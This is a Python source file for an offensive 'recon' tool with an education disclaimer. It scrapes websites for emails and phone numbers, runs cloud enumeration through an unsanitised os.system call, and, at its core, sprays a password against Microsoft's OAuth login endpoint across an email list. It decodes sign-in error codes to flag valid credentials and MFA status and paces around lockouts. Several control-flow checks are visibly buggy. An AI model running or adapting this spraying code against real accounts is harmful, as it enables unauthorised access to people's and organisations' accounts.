from urllib.parse import urlparse
from colorama import Fore, Style
from sys import argv, exit
from tools import export
import requests
import time
import os
import re

# Global variable
session = requests.session()
session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' \
                                '(KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36'
INFO, FAIL, CLOSE, SUCCESS = Fore.YELLOW + Style.BRIGHT, \
                             Fore.RED + Style.BRIGHT, \
                             Style.RESET_ALL, \
                             Fore.GREEN + Style.BRIGHT
banner = r'''==========================================================
     _ _    _    _                        _           _
  __| | | _| | _| |_      _ __  _ __ ___ (_) ___  ___| |_
 / _` | |/ / |/ / __|____| '_ \| '__/ _ \| |/ _ \/ __| __|
| (_| |   <|   <| ||_____| |_) | | | (_) | |  __/ (__| |_
 \__,_|_|\_\_|\_\\__|    | .__/|_|  \___// |\___|\___|\__|
                         |_|           |__/
==========================================================

# Note: Every company will have their own model, so this
project built to make for demonstration.
# Disclaimer: This tools make for education purpose, any 
problem will be your own risk.

----------------------------------------------------------
'''

list_urls = []
list_phones = []
list_emails = []
others_output = ''


def valid_link(core_url: str, crawled_link: str) -> str:
    """
    This Function used to check and valid that is a link format
    :param core_url:
    :param crawled_link:
    :return:
    """
    final_url = crawled_link
    base_url = urlparse(core_url)
    regex = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z\d](?:[A-Z\d-]{0,61}[A-Z\d])?\.)+(?:[A-Z]{2,6}\.?|[A-Z\d-]{2,}\.?)|'
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    if not re.match(regex, final_url):
        if crawled_link[0] == '/':
            final_url = f"{base_url.scheme}://{base_url.netloc}{crawled_link}"
        else:
            final_url = f"{base_url.scheme}://{base_url.netloc}/{crawled_link}"
    return final_url


def get_all_link(link: str):
    """
    Used to get all links in current web page
    :param link:
    :return:
    """
    response = session.get(link).text
    src_link = re.findall(r'src="(.+?)"', response)
    href_link = re.findall(r'href="(.+?)"', response)
    list_crawled_link = src_link + href_link
    print('\n[*] Web Resources:')
    for src in list_crawled_link:
        if 'blob.core.windows.net' in src \
                or 'file.core.windows.net' in src:
            print(f'   [+] Web resource: {src}')
            list_urls.append(src)
        else:
            tmp_link = valid_link(link, src)
            print(f'   [+] Web resource: {tmp_link}')
            list_urls.append(tmp_link)
    if not list_urls:
        print('   [-] Web resource not found!')


def get_contact(list_links: list):
    """
    Used to find and get emails, phone number (###-###-####)
    :param list_links:
    :return: List_Phone_number, List_email
    """
    for link in list_links:
        try:
            if re.match(re.compile(r'.*\.(php)|(html)|(aspx)$'), link):
                print(f'\n[*] Checking Social contact on website: {link}')
                respond = session.get(link)
                html = respond.text.replace('&#8203', '')
                respond.close()
                list_phone_number = re.findall(r'\d+\-\d+\-\d+', html)
                if list_phone_number:
                    print(f'   [!] Phone Found:')
                    for phone in list_phone_number:
                        print(f'      [+] Phone number: {phone}')
                        list_phones.append(phone)

                list_email = re.findall(r'[\w_-]+@[\w._-]+\.\w+', html)
                if list_email:
                    print(f'   [!] Emails Found:')
                    for email in list_email:
                        print(f'      [+] Email: {email}')
                        list_emails.append(email)
                if not list_phone_number and not list_email:
                    print('  [-] Not found any email or phone on this file')
        except ValueError:
            pass


def option_panel():
    """
    Print option table for user to select option, after executed
    :return:
    """
    global others_output
    option_table = '''
Option 1: Reconnaissance the targeted website
Option 2: DNS Scanning
Option 3: Password spraying
Option 4: Extract data (HTML/TXT)
Option 5: Exit
'''
    from time import sleep
    from os import system

    try:
        try:
            print(option_table)
            try:
                option = int(input('>> Enter your option: '))
            except ValueError:
                option = int(input('>> Enter your option: '))
            # ==============================================================
            if option == 1:
                url = input('[*] Enter Url: ')
                get_all_link(url)
                get_contact(list_urls)
                return option_panel()
            # ==============================================================
            elif option == 2:
                input_keyword = input('[*] Enter keywords: ')
                input_mutation = input("[*] Enter Mutations: (default: wordlist/fuzz.txt): ")
                if input_mutation == '':
                    input_mutation = os.getcwd() + '/wordlist/fuzz.txt'
                if not os.access(input_mutation, os.R_OK):
                    while os.access(input_mutation, os.R_OK):
                        input_mutation = input("[*] Enter Mutations: (default: wordlist/fuzz.txt): ")
                input_brute = input("[*] Enter Brute-list (default: wordlist/fuzz.txt): ")
                if input_brute == '':
                    input_brute = os.getcwd() + '/wordlist/fuzz.txt'
                if not os.access(input_brute, os.R_OK):
                    while os.access(input_brute, os.R_OK):
                        input_brute = input("[*] Enter Brute-list (default: wordlist/fuzz.txt): ")

                os.system(f'python tools/cloud_enum.py -k {input_keyword} -b {input_brute} -m {input_mutation} -l 1.txt -t 10')
                others_output = others_output + '\n' + open('1.txt', 'r', encoding='utf8').read()
                os.remove('1.txt')
                return option_panel()
            # ==============================================================
            elif option == 3:
                counter = 0
                lockout_counter = 0
                input_emails = input('Input email wordlist (default wordlist/wordlist_emails.txt): ')
                if input_emails == '':
                    input_emails = os.getcwd() + '/wordlist/wordlist_emails.txt'
                    lockout = input('[*] Input lockout time (default is 1 secs): ')
                    if lockout == '':
                        lockout = 1
                    timeout = input('[*] Input timeout (default is 1 secs): ')
                    if timeout == '':
                        timeout = 1
                password = input('Input password: ')
                with open(input_emails) as input_emails:
                    for line in input_emails:
                        email_split = line.split()
                        email = ' '.join(email_split)
                        s = requests.session()
                        body = 'grant_type=password&password=' + \
                               password + \
                               '&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=' + \
                               email + \
                               '&resource=https://graph.windows.net&client_info=1&scope=openid'
                        requestURL = "https://login.microsoft.com/common/oauth2/token"
                        url_request = requests.post(requestURL, data=body)
                        response = url_request.text
                        valid_response = re.search('53003', response)
                        account_doesnt_exist = re.search('50034', response)
                        account_invalid_password = re.search('50126', response)
                        account_disabled = re.search('The user account is disabled', response)
                        valid_response1 = re.search('7000218', response)
                        password_expired = re.search('50055', response)
                        account_locked_out = re.search('50053', response)
                        mfa_true = re.search('50076', response)
                        mfa_true1 = re.search('50079', response)
                        desktopsso_response = re.search(
                            '{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
                        conditional_access = re.search('50158', response)
                        if valid_response:
                            counter = counter + 1
                            b = SUCCESS + "Result - " + " " * 1 + "VALID PASSWORD! [+]"
                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
                        if valid_response1:
                            counter = counter + 1
                            b = SUCCESS + "Result - " + " " * 15 + "VALID PASSWORD! [+]"
                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
                        if account_doesnt_exist:
                            b = " Result - " + " " * 14 + "INVALID ACCOUNT! [-]"
                            print(FAIL + f"[-] {email:43} {b}" + CLOSE)
                        if account_disabled:
                            b = "Result - " + " " * 11 + "ACCOUNT DISABLED. [!]"
                            print(INFO + f"[!] {email:44} {b}" + CLOSE)
                        if account_locked_out:
                            b = "Result - " + " " * 13 + "LOCKOUT DETECTED! [!]"
                            print(INFO + f"[!] {email:44} {b}" + CLOSE)
                            lockout_counter = lockout_counter + 1
                            if lockout:
                                lock_time = lockout
                            if lockout is None:
                                lock_time = 1
                                lockout = int(lock_time) * 60
                            if lockout_counter == 3:
                                print(FAIL + f'\n[WARN] Multiple lockouts detected.\n')
                                con_proc = input(
                                    "Would you like to continue the scan after the lockout period is over? (y/n) ")
                                if con_proc == "y" or "Y":
                                    print(
                                        INFO + f"Waiting {lockout} seconds before continuing.")
                                    lockout = lockout - 30
                                    sleep(int(lockout))
                                    print(INFO + f'\nContinuing scan in 30 seconds.')
                                    sleep(int(30))
                                    lockout_counter = 0
                                elif con_proc == "n" or "N":
                                    print(INFO + "Quitting.")
                                    return option_panel()
                                else:
                                    print(
                                        FAIL + f"\n[warn] Invalid input. Quitting.\n")
                                    return option_panel()
                        if desktopsso_response:
                            a = email
                            b = " Result -  Desktop SSO Enabled [!]"
                            print(INFO + f'[!] {a:51} {b} ' + CLOSE)
                        if account_invalid_password:
                            a = email
                            b = " Result - " + " " * 10 + "Invalid Credentials! [-]"
                            print(FAIL + f"[-] {email:43} {b}" + CLOSE)
                        if password_expired:
                            a = email
                            b = " Result - " + " " * 9 + "User Password Expired [!]"
                            print(INFO + f"[!] {email:43} {b}" + CLOSE)
                        if mfa_true:
                            counter = counter + 1
                            a = email
                            b = "Result -   VALID PASSWORD - MFA ENABLED [+]"
                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
                        if mfa_true1:
                            counter = counter + 1
                            a = email
                            b = "Result - MFA ENABLED NOT YET CONFIGURED [+]"
                            print(SUCCESS + f"[+] {email:44} {b}" + CLOSE)
                        if conditional_access:
                            counter = counter + 1
                            a = email
                            b = "Result - Duo MFA or other conditional access [+]"
                            print(SUCCESS + f"[!] {email:44} {b}" + CLOSE)
                        if timeout is not None:
                            sleep(int(timeout))

                    if counter == 0:
                        print(
                            FAIL + '\n[-] There were no valid logins found. [-]' + CLOSE)
                        print(
                            INFO + f'\n[info] Scan completed at {time.ctime()}' + CLOSE)
                    elif counter == 1:
                        print(
                            INFO + '\n[info] Discovered one valid credential pair.' + CLOSE)
                        print(
                            INFO + f'\n[info] Scan completed at {time.ctime()}' + CLOSE)
                    else:
                        print(
                            INFO + f'\n[info] Discovered {counter} valid credential pairs.\n' + CLOSE)
                        print(
                            INFO + f'\n[info] Scan completed at {time.ctime()}' + CLOSE)
                return option_panel()
            # ==============================================================
            elif option == 4:
                if not list_urls and not others_output and not list_emails and not list_phones:
                    print('[-] There is no data to print output')
                    sleep(3)
                    system('cls')
                else:
                    export.main(list_urls, list_phones, list_emails, others_output)
                return option_panel()

            # ==============================================================
            elif option == 5:
                print('-----------------------------\n[-] Exit the program!')
                exit(0x0)
            else:
                print('[-] Wrong option!')
                sleep(3)
                system('cls')
                return option_panel()
        except IOError:
            print('[!] Error when processing\n\n')
            return option_panel()
    except KeyboardInterrupt:
        print('\n-----------------------------\n[!] Keyboard Interruption.')
        exit(0x1)


if __name__ == '__main__':
    if '-q' not in argv:
        print(banner)
    option_panel()
